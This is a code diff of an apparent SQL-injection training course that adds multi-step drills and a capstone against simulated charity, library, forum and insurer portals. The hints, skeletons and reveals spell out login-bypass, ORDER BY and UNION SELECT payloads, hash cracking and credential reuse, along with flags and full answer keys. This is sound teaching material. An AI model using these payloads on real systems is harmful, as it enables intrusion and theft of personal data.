@@ -320,17 +320,21 @@ function InjectionAct({ onCapture }: { onCapture: () => void }) {
 
 /* ───────────────────────── consolidation drills ───────────────────────── */
 
+type DrillStep = {
+  surface: "login" | "search"; goal: string; palette: string[];
+  hint: string; skeleton: string; reveal: string;
+  done: (r: RangeRunResult & { authed?: boolean }, input: string) => boolean;
+};
 type DrillCfg = {
-  client: string; brief: string; surface: "login" | "search"; host: string;
-  spec: ScenarioSpec; goal: string; palette: string[]; hint: string; skeleton: string; reveal: string;
-  done: (r: RangeRunResult & { authed?: boolean }) => boolean; success: string;
+  client: string; brief: string; host: string;
+  spec: ScenarioSpec; steps: DrillStep[]; success: string;
 };
 
 const DRILLS: DrillCfg[] = [
   {
     client: "Harborlight - children's charity",
     brief: "Harborlight's donor portal goes live Monday. They've asked Redoubt for a quick smoke test of the login first. No step-by-step this time - you've done this move on Northwind. Prove a stranger can't walk in without a password.",
-    surface: "login", host: "give.harborlight.range · donor login",
+    host: "give.harborlight.range · donor login",
     spec: {
       setup: `CREATE TABLE donors (id INTEGER PRIMARY KEY, email TEXT, pass TEXT, role TEXT);
               INSERT INTO donors (email,pass,role) VALUES
@@ -338,18 +342,21 @@ const DRILLS: DrillCfg[] = [
                 ('p.rao@harborlight.range','welcome1','staff');`,
       login: { table: "donors", select: "id, email, role", emailCol: "email", passCol: "pass", adminRole: "admin", roleIdx: 2 },
     },
-    goal: "Log into the donor portal with no valid password.",
-    palette: ["'", " OR 1=1", "--"],
-    hint: "Same front-door move as Northwind: close the string, force it true, comment out the rest. Email field; password blank.",
-    skeleton: "' OR ___ --",
-    reveal: "' OR 1=1--",
-    done: (r) => !!r.authed,
+    steps: [
+      {
+        surface: "login", goal: "Log into the donor portal with no valid password.",
+        palette: ["'", " OR 1=1", "--"],
+        hint: "Same front-door move as Northwind: close the string, force it true, comment out the rest. Email field; password blank.",
+        skeleton: "' OR ___ --", reveal: "' OR 1=1--",
+        done: (r) => !!r.authed,
+      },
+    ],
     success: "Signed in with no password - Harborlight's login trusts user input exactly like Northwind's did. Finding logged for them.",
   },
   {
     client: "Meridian Library",
-    brief: "Meridian Library's public catalogue search sits on the same database as its member records. The library thinks the search box is harmless because 'it only searches books'. Show them a search box is a window onto the whole database.",
-    surface: "search", host: "catalogue.meridian.range · book search",
+    brief: "Meridian Library's public catalogue search sits on the same database as its member records. The library thinks the search box is harmless because 'it only searches books'. Show them a search box is a window onto the whole database - work it yourself, start to finish.",
+    host: "catalogue.meridian.range · book search",
     spec: {
       setup: `CREATE TABLE books (id INTEGER PRIMARY KEY, title TEXT, author TEXT);
               INSERT INTO books (title,author) VALUES ('Coding for Teens','A. Price'),('The Web Book','R. Shah');
@@ -357,18 +364,28 @@ const DRILLS: DrillCfg[] = [
               INSERT INTO members (name,cardno) VALUES ('Jamie Fox','MEM-4471'),('Sara Khan','MEM-8820');`,
       search: { table: "books", select: "id, title, author", searchCol: "title" },
     },
-    goal: "UNION the members table out through the book search to read a member's card number.",
-    palette: ["'", " UNION SELECT ", "id", "name", "cardno", ",", " FROM members", "--"],
-    hint: "The book search returns 3 columns (id, title, author). Match it with three, from the members table.",
-    skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --",
-    reveal: "' UNION SELECT id, name, cardno FROM members--",
-    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.startsWith("MEM-"))),
-    success: "Member records pulled straight out of a 'book' search. Same UNION skill, brand-new target. Finding logged.",
+    steps: [
+      {
+        surface: "search", goal: "First, work out how many columns the book search returns. Climb ORDER BY until it errors.",
+        palette: ["'", " ORDER BY 1", " ORDER BY 2", " ORDER BY 3", " ORDER BY 4", "--"],
+        hint: "' ORDER BY 4-- errors (no 4th column), ' ORDER BY 3-- works - so 3 columns.",
+        skeleton: "' ORDER BY ___ --", reveal: "' ORDER BY 3--",
+        done: (r, input) => /order\s+by\s+3\b/i.test(input) && r.error == null,
+      },
+      {
+        surface: "search", goal: "Three columns. Now UNION the members table out to read a member's card number.",
+        palette: ["'", " UNION SELECT ", "id", "name", "cardno", ",", " FROM members", "--"],
+        hint: "Match the three columns, from the members table: id, name, cardno.",
+        skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --", reveal: "' UNION SELECT id, name, cardno FROM members--",
+        done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.startsWith("MEM-"))),
+      },
+    ],
+    success: "Member records pulled straight out of a 'book' search - counted the columns, then UNIONed them yourself. Finding logged.",
   },
   {
     client: "Fenwick Forums",
-    brief: "Last field job, and the trickiest. Fenwick's community forum has a thread search wired to the same database that stores member logins - but this search returns a different number of columns. No walkthrough: work out the shape yourself, then pull the members out.",
-    surface: "search", host: "forum.fenwick.range · thread search",
+    brief: "Last field job, and the trickiest. Fenwick's community forum has a thread search wired to the same database that stores member logins - but this search is a different shape. No walkthrough: work out the columns, then pull the members out.",
+    host: "forum.fenwick.range · thread search",
     spec: {
       setup: `CREATE TABLE threads (id INTEGER PRIMARY KEY, title TEXT, author TEXT, posted TEXT);
               INSERT INTO threads (title,author,posted) VALUES ('Welcome','admin','2026-01-02'),('Forum rules','mod','2026-01-03');
@@ -378,23 +395,34 @@ const DRILLS: DrillCfg[] = [
                 ('admin','admin@fenwick.range','F0rum_Adm1n');`,
       search: { table: "threads", select: "id, title, author, posted", searchCol: "title" },
     },
-    goal: "This search returns FOUR columns, not three. Count them with ORDER BY first, then UNION the members table (id, username, email, pass).",
-    palette: ["'", " ORDER BY 4", " ORDER BY 5", " UNION SELECT ", "id", "username", "email", "pass", ",", " FROM members", "--"],
-    hint: "' ORDER BY 5-- errors, ' ORDER BY 4-- works - so four columns. Match four from members.",
-    skeleton: "' UNION SELECT ___, ___, ___, ___ FROM members --",
-    reveal: "' UNION SELECT id, username, email, pass FROM members--",
-    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@fenwick.range"))),
-    success: "Credentials pulled from a forum search - and you worked out the column count yourself. That's the real skill. Finding logged.",
+    steps: [
+      {
+        surface: "search", goal: "This search is wider than the last. Count its columns with ORDER BY before you UNION.",
+        palette: ["'", " ORDER BY 3", " ORDER BY 4", " ORDER BY 5", "--"],
+        hint: "' ORDER BY 5-- errors, ' ORDER BY 4-- works - so 4 columns.",
+        skeleton: "' ORDER BY ___ --", reveal: "' ORDER BY 4--",
+        done: (r, input) => /order\s+by\s+4\b/i.test(input) && r.error == null,
+      },
+      {
+        surface: "search", goal: "Four columns. UNION the members table (id, username, email, pass).",
+        palette: ["'", " UNION SELECT ", "id", "username", "email", "pass", ",", " FROM members", "--"],
+        hint: "Match four, from members: id, username, email, pass.",
+        skeleton: "' UNION SELECT ___, ___, ___, ___ FROM members --", reveal: "' UNION SELECT id, username, email, pass FROM members--",
+        done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@fenwick.range"))),
+      },
+    ],
+    success: "Credentials pulled from a forum search - you counted a different column shape and adapted. That's the real skill. Finding logged.",
   },
 ];
 
 function DrillSurface({ cfg, onSolved }: { cfg: DrillCfg; onSolved: () => void }) {
   const [sc, setSc] = useState<ScenarioRange | null>(null);
+  const [si, setSi] = useState(0);
   const [val, setVal] = useState("");
   const [pass, setPass] = useState("");
   const [res, setRes] = useState<(RangeRunResult & { authed?: boolean }) | null>(null);
+  const [showHint, setShowHint] = useState(false);
   const [solved, setSolved] = useState(false);
-  const [showReveal, setShowReveal] = useState(false);
 
   useEffect(() => {
     let live = true;
@@ -402,11 +430,17 @@ function DrillSurface({ cfg, onSolved }: { cfg: DrillCfg; onSolved: () => void }
     return () => { live = false; };
   }, [cfg]);
 
+  const step = cfg.steps[si];
+  const multi = cfg.steps.length > 1;
+
   function run() {
     if (!sc) return;
-    const r = cfg.surface === "login" ? sc.attemptLogin(val, pass) : sc.search(val);
+    const r = step.surface === "login" ? sc.attemptLogin(val, pass) : sc.search(val);
     setRes(r);
-    if (cfg.done(r)) { setSolved(true); onSolved(); }
+    if (step.done(r, val)) {
+      if (si + 1 < cfg.steps.length) setTimeout(() => { setSi(si + 1); setVal(""); setRes(null); setShowHint(false); }, 650);
+      else { setSolved(true); onSolved(); }
+    }
   }
 
   return (
@@ -414,11 +448,11 @@ function DrillSurface({ cfg, onSolved }: { cfg: DrillCfg; onSolved: () => void }
       <div style={{ padding: "14px 16px", borderBottom: `1px solid ${C.lineSoft}` }}>
         <div style={{ fontFamily: DISP, fontWeight: 700, fontSize: 15.5, color: C.ink }}>{cfg.client}</div>
         <p style={{ color: C.soft, fontSize: 13.5, lineHeight: 1.55, margin: "6px 0 0" }}>{cfg.brief}</p>
-        <div style={{ fontSize: 13.5, color: C.indigo2, marginTop: 8 }}>▸ {G(cfg.goal, `drill-${cfg.host}`)}</div>
+        <div style={{ fontSize: 13.5, color: C.indigo2, marginTop: 8 }}>▸ {multi ? <b style={{ fontFamily: MONO, fontSize: 11.5 }}>Step {si + 1}/{cfg.steps.length}: </b> : null}{G(step.goal, `drill-${cfg.host}-${si}`)}</div>
       </div>
       <WinBar host={cfg.host} />
       <div style={{ padding: 18 }}>
-        {cfg.surface === "login" ? (
+        {step.surface === "login" ? (
           <>
             <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={val} onChange={(e) => setVal(e.target.value)} placeholder="name@…" /></div>
             <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={pass} onChange={(e) => setPass(e.target.value)} placeholder="(leave blank)" /></div>
@@ -426,22 +460,22 @@ function DrillSurface({ cfg, onSolved }: { cfg: DrillCfg; onSolved: () => void }
         ) : (
           <div style={{ marginBottom: 14 }}><label style={lab}>search</label><input style={inp} value={val} onChange={(e) => setVal(e.target.value)} placeholder="search…" /></div>
         )}
-        <Palette tokens={cfg.palette} onInsert={(t) => setVal(val + t)} />
+        <Palette tokens={step.palette} onInsert={(t) => setVal(val + t)} />
         <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 14 }}>
-          <Btn tone="i" onClick={run} disabled={!sc}>{cfg.surface === "login" ? "RUN LOGIN →" : "RUN SEARCH →"}</Btn>
+          <Btn tone="i" onClick={run} disabled={!sc || solved}>{step.surface === "login" ? "RUN LOGIN →" : "RUN SEARCH →"}</Btn>
           <button onClick={() => setVal("")} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>clear</button>
         </div>
         {res && <ResultView r={res} />}
         {!solved && (
           <div style={{ marginTop: 12 }}>
-            {!showReveal ? (
-              <button onClick={() => setShowReveal(true)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>hint</button>
+            {!showHint ? (
+              <button onClick={() => setShowHint(true)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>hint</button>
             ) : (
               <div style={{ padding: "9px 12px", borderLeft: `2px solid ${C.indigo}`, background: "rgba(139,123,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>
-                {cfg.hint}
+                {step.hint}
                 <div style={{ marginTop: 7, display: "flex", gap: 14, flexWrap: "wrap" }}>
-                  <button onClick={() => setVal(cfg.skeleton)} style={{ background: "none", border: "none", color: C.cyan, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>show the structure</button>
-                  <button onClick={() => setVal(cfg.reveal)} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>reveal the full answer</button>
+                  <button onClick={() => setVal(step.skeleton)} style={{ background: "none", border: "none", color: C.cyan, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>show the structure</button>
+                  <button onClick={() => setVal(step.reveal)} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>reveal the full answer</button>
                 </div>
               </div>
             )}
@@ -477,6 +511,180 @@ function ConsolidationDrills({ onDone }: { onDone: () => void }) {
   );
 }
 
+/* ───────────────────────── capstone challenge ─────────────────────────
+ * A full, unguided engagement that chains everything: bypass a login -> UNION
+ * out the staff table (hashes) -> crack the admin's hash -> log back in with
+ * the real password (credential reuse). The two injection steps give ONE hint
+ * and a structure scaffold but NO full auto-reveal, so even someone who knows
+ * the move has to type it - this is the part that fills the clock. */
+
+const CAP_SPEC: ScenarioSpec = {
+  setup: `CREATE TABLE tickets (id INTEGER PRIMARY KEY, subject TEXT, status TEXT);
+          INSERT INTO tickets (subject,status) VALUES ('Password reset','open'),('Billing query','closed'),('Login issue','open');
+          CREATE TABLE staff (id INTEGER PRIMARY KEY, email TEXT, passhash TEXT, role TEXT);
+          INSERT INTO staff (email,passhash,role) VALUES
+            ('a.flint@vantage.range','3b5a9c2f1e8d4a7b6c0f9e2d1a4b7c8e','admin'),
+            ('r.cole@vantage.range','9f1e2d3c4b5a6978e0d1c2b3a4958677','staff');`,
+  login: { table: "staff", select: "id, email, role", emailCol: "email", passCol: "passhash", adminRole: "admin", roleIdx: 2 },
+  search: { table: "tickets", select: "id, subject, status", searchCol: "subject" },
+};
+const ADMIN_EMAIL = "a.flint@vantage.range";
+const ADMIN_HASH = "3b5a9c2f1e8d4a7b6c0f9e2d1a4b7c8e";
+const ADMIN_PW = "Vantage2026!";
+const RAINBOW: { word: string; hash: string }[] = [
+  { word: "letmein", hash: "0d107d09f5bbe40cade3de5c71e9e9b7" },
+  { word: "password1", hash: "7c6a180b36896a0a8c02787eeafb0e4c" },
+  { word: "Vantage2026!", hash: ADMIN_HASH },
+  { word: "summer23", hash: "5ebe2294ecd0e0f08eab7690d2a6ee69" },
+  { word: "vantage", hash: "1b0c3e5a7d9f2b4c6e8a0d1f3b5c7e9a" },
+];
+const CAP_FLAG = "flag{cr4ck3d_and_reus3d}";
+
+type CapStep = { key: string; title: string; surface: "login" | "search"; goal: string; palette: string[]; hint: string; skeleton: string; done: (r: RangeRunResult & { authed?: boolean }) => boolean };
+const CAP_STEPS: CapStep[] = [
+  {
+    key: "in", title: "Break in", surface: "login",
+    goal: "Vantage Mutual's staff console builds its login query from your input. Get in with no password. (One hint and a structure if you need it - but no full reveal this time.)",
+    palette: ["'", " OR 1=1", "--"], skeleton: "' OR ___ --",
+    hint: "Same front-door move you've done all module: close the string, force it true, comment the rest. Email field; password blank.",
+    done: (r) => !!r.authed,
+  },
+  {
+    key: "dump", title: "Dump the hashes", surface: "search",
+    goal: "Inside, the support-ticket search is injectable too, and it returns 3 columns. UNION the staff table out through it to pull every email, password hash and role.",
+    palette: ["'", " UNION SELECT ", "email", "passhash", "role", ",", " FROM staff", "--"], skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --",
+    hint: "3 columns, from the staff table: email, passhash, role.",
+    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@vantage.range"))),
+  },
+];
+
+function CapstoneChallenge({ onDone }: { onDone: () => void }) {
+  const [sc, setSc] = useState<ScenarioRange | null>(null);
+  const [phase, setPhase] = useState(0); // 0,1 = injection steps; 2 = crack; 3 = reuse
+  const [email, setEmail] = useState(""); const [pass, setPass] = useState(""); const [term, setTerm] = useState("");
+  const [res, setRes] = useState<(RangeRunResult & { authed?: boolean }) | null>(null);
+  const [showHint, setShowHint] = useState(false);
+  const [cracked, setCracked] = useState(false);
+  const [crackMsg, setCrackMsg] = useState<string | null>(null);
+  const [reEmail, setReEmail] = useState(""); const [rePass, setRePass] = useState("");
+  const [won, setWon] = useState(false); const [reMsg, setReMsg] = useState<string | null>(null);
+
+  useEffect(() => { let live = true; bootScenario(CAP_SPEC).then((s) => live && setSc(s)).catch(() => {}); return () => { live = false; }; }, []);
+  if (!sc) return <div style={{ fontFamily: MONO, fontSize: 13, color: C.mute }}>// booting Vantage Mutual range…</div>;
+
+  const step = phase < 2 ? CAP_STEPS[phase] : null;
+  const field = step?.surface === "login" ? email : term;
+  const setField = step?.surface === "login" ? setEmail : setTerm;
+
+  function runStep() {
+    if (!sc || !step) return;
+    const r = step.surface === "login" ? sc.attemptLogin(email, pass) : sc.search(term);
+    setRes(r);
+    if (step.done(r)) setTimeout(() => { setRes(null); setShowHint(false); setPhase(phase + 1); }, 700);
+  }
+  function tryWord(e: { word: string; hash: string }) {
+    if (e.hash === ADMIN_HASH) { setCracked(true); setCrackMsg(`Cracked - ${ADMIN_EMAIL} : ${e.word}`); }
+    else setCrackMsg(`"${e.word}" doesn't match the admin's hash. Keep going.`);
+  }
+  function reuse() {
+    if (reEmail.trim().toLowerCase() === ADMIN_EMAIL && rePass === ADMIN_PW) setWon(true);
+    else setReMsg("Those aren't the admin's real credentials - use the email and the password you cracked.");
+  }
+
+  const pct = (phase / 4) * 100;
+  return (
+    <div style={{ display: "grid", gap: 14 }}>
+      <div style={{ fontFamily: MONO, fontSize: 11, color: C.mute }}>Vantage Mutual · full engagement · step {Math.min(phase + 1, 4)} of 4</div>
+      <div style={{ height: 6, borderRadius: 999, background: "rgba(255,255,255,0.07)", overflow: "hidden" }}><div style={{ height: "100%", width: `${pct}%`, background: `linear-gradient(90deg, ${C.indigo}, ${C.amber})`, transition: "width .4s" }} /></div>
+
+      {step && (
+        <>
+          <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
+            <b style={{ color: C.indigo2, fontFamily: DISP }}>{step.title}. </b>{G(step.goal, `cap-${step.key}`)}
+          </div>
+          <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
+            <WinBar host={step.surface === "login" ? "console.vantage.range · staff login" : "console.vantage.range · ticket search"} />
+            <div style={{ padding: 18 }}>
+              {step.surface === "login" ? (
+                <>
+                  <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={email} onChange={(e) => setEmail(e.target.value)} placeholder="name@vantage.range" /></div>
+                  <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={pass} onChange={(e) => setPass(e.target.value)} placeholder="(leave blank)" /></div>
+                </>
+              ) : (
+                <div style={{ marginBottom: 14 }}><label style={lab}>search tickets</label><input style={inp} value={term} onChange={(e) => setTerm(e.target.value)} placeholder="e.g. billing" /></div>
+              )}
+              <Palette tokens={step.palette} onInsert={(t) => setField(field + t)} />
+              <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 14 }}>
+                <Btn tone="i" onClick={runStep}>{step.surface === "login" ? "RUN LOGIN →" : "RUN SEARCH →"}</Btn>
+                <button onClick={() => setField("")} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>clear</button>
+              </div>
+              {res && <ResultView r={res} />}
+              <div style={{ marginTop: 12, display: "flex", gap: 14, alignItems: "center", flexWrap: "wrap" }}>
+                {!showHint ? (
+                  <button onClick={() => setShowHint(true)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>hint</button>
+                ) : (
+                  <div style={{ padding: "9px 12px", borderLeft: `2px solid ${C.indigo}`, background: "rgba(139,123,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>
+                    {step.hint}
+                    <div style={{ marginTop: 7 }}><button onClick={() => setField(step.skeleton)} style={{ background: "none", border: "none", color: C.cyan, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>show the structure</button></div>
+                  </div>
+                )}
+              </div>
+            </div>
+          </div>
+        </>
+      )}
+
+      {phase === 2 && (
+        <>
+          <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
+            <b style={{ color: C.indigo2, fontFamily: DISP }}>Crack the admin's hash. </b>{G("You pulled the admin's password as a hash, not plain text. Hashes are one-way - but weak ones fall to a rainbow table (precomputed hash -> word). Find the word whose hash matches the admin's.", "cap-crack")}
+          </div>
+          <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, padding: 16 }}>
+            <div style={{ fontFamily: MONO, fontSize: 12, color: C.soft, marginBottom: 12 }}>admin hash · <span style={{ color: C.amber }}>{ADMIN_HASH}</span></div>
+            <div style={{ fontFamily: MONO, fontSize: 10.5, letterSpacing: ".1em", color: C.indigo, fontWeight: 700, marginBottom: 8 }}>⌦ RAINBOW TABLE · tap the match</div>
+            <div style={{ display: "grid", gap: 6 }}>
+              {RAINBOW.map((e) => (
+                <button key={e.word} onClick={() => tryWord(e)} disabled={cracked} className="co-opt" style={{ textAlign: "left", display: "flex", justifyContent: "space-between", gap: 10, flexWrap: "wrap", padding: "8px 12px", borderRadius: 8, border: `1px solid ${cracked && e.hash === ADMIN_HASH ? C.green : C.lineSoft}`, background: C.carbon, color: C.soft, cursor: cracked ? "default" : "pointer" }}>
+                  <span style={{ fontFamily: MONO, fontSize: 12.5, color: C.ink }}>{e.word}</span>
+                  <span style={{ fontFamily: MONO, fontSize: 12, color: "#8fa0c8", wordBreak: "break-all" }}>{e.hash}</span>
+                </button>
+              ))}
+            </div>
+            {crackMsg && <div style={{ marginTop: 10, fontFamily: MONO, fontSize: 12.5, color: cracked ? C.green : C.soft }}>{crackMsg}</div>}
+            {cracked && <div style={{ marginTop: 12 }}><Btn tone="g" onClick={() => setPhase(3)}>Now reuse it →</Btn></div>}
+          </div>
+        </>
+      )}
+
+      {phase === 3 && (
+        <>
+          <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
+            <b style={{ color: C.indigo2, fontFamily: DISP }}>Reuse the credentials. </b>{G("The injection got you in, but now you have the admin's REAL password. Log in the normal way as the admin - that's credential reuse, and it works anywhere they used the same password.", "cap-reuse")}
+          </div>
+          <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
+            <WinBar host="console.vantage.range · staff login" />
+            <div style={{ padding: 18 }}>
+              <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={reEmail} onChange={(e) => setReEmail(e.target.value)} placeholder="the admin's email you found" /></div>
+              <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={rePass} onChange={(e) => setRePass(e.target.value)} placeholder="the password you cracked" /></div>
+              <Btn tone="g" onClick={reuse}>LOG IN AS ADMIN →</Btn>
+              {reMsg && !won && <div style={{ marginTop: 11, fontFamily: MONO, fontSize: 12.5, color: C.red }}>{reMsg}</div>}
+            </div>
+          </div>
+        </>
+      )}
+
+      {won && (
+        <div className="co-anim co-pop" style={{ textAlign: "center", padding: "20px", borderRadius: 14, background: "rgba(85,217,140,.08)", border: `1px solid ${C.green}55` }}>
+          <div style={{ fontFamily: MONO, fontSize: 11, letterSpacing: ".2em", color: C.green, fontWeight: 700 }}>CHALLENGE COMPLETE</div>
+          <div style={{ fontFamily: MONO, fontSize: 13.5, color: C.green, marginTop: 8 }}>{CAP_FLAG}</div>
+          <p style={{ fontSize: 13.5, color: C.soft, lineHeight: 1.5, margin: "10px auto 14px", maxWidth: "48ch" }}>Bypass, dump, crack, reuse - a full real-world chain, start to finish, in your own hands.</p>
+          <Btn tone="g" onClick={onDone}>Continue to the debrief →</Btn>
+        </div>
+      )}
+    </div>
+  );
+}
+
 /* ───────────────────────── module def ───────────────────────── */
 
 export const MODULE5: ModuleDef = {
@@ -485,7 +693,7 @@ export const MODULE5: ModuleDef = {
   title: "Injection",
   client: "Northwind Foods",
   brief:
-    "A deep engagement. Northwind Foods' staff portal and product shop both build their database queries straight from whatever you type. Your job is the full job: prove the weakness, break in, work out the shape of the data, read out the staff records, map what else is in there, lift the customer card data, and reach the one secret they really didn't want found. Then three field jobs for new clients. All for real.",
+    "A deep engagement. Northwind Foods' staff portal and product shop both build their database queries straight from whatever you type. Your job is the full job: prove the weakness, break in, work out the shape of the data, read out the staff records, map what else is in there, lift the customer card data, and reach the one secret they really didn't want found. Then three field jobs for new clients, and a final challenge you run start to finish on your own. All for real.",
   lesson: {
     blocks: [
       { h: "First - what's a database?", body: "Almost every app stores its information in a database: an organised store you can picture as a stack of spreadsheets. Each table is one sheet (a 'users' table, a 'products' table), and each row is one record. The app reads and writes it constantly - your login, your messages, your scores all live there. The app talks to the database in a language called SQL, by sending it a query." },
@@ -519,10 +727,11 @@ export const MODULE5: ModuleDef = {
     offLimits: "DROP/DELETE/UPDATE, other Northwind hosts, real data",
     timebox: "this session",
   },
-  handler: "Seven stages, then three field jobs. Confirm it's injectable, walk in the front door, work out the shape of the data, then turn the search box into a window onto the whole database - staff, card records, and the vault. Try each yourself before the hints; if the typing trips you up, 'show the structure' drops a skeleton in for you to fill. Password field stays empty throughout; you're going around it.",
+  handler: "Seven stages, three field jobs, then one full challenge. Confirm it's injectable, walk in the front door, work out the shape of the data, then turn the search box into a window onto the whole database - staff, card records, and the vault. Try each yourself before the hints; if the typing trips you up, 'show the structure' drops a skeleton in for you to fill. Password field stays empty throughout; you're going around it.",
   hint: "This is a multi-stage engagement - work the stages in order. Each has a hint ladder, a 'show the structure' scaffold, and a last-resort reveal. The password field can stay empty; you're going around it, not guessing it.",
   Act: InjectionAct,
   Consolidation: ConsolidationDrills,
+  Capstone: CapstoneChallenge,
   flag: "flag{un10n_t0_the_v4ult}",
   defend: {
     blocks: [
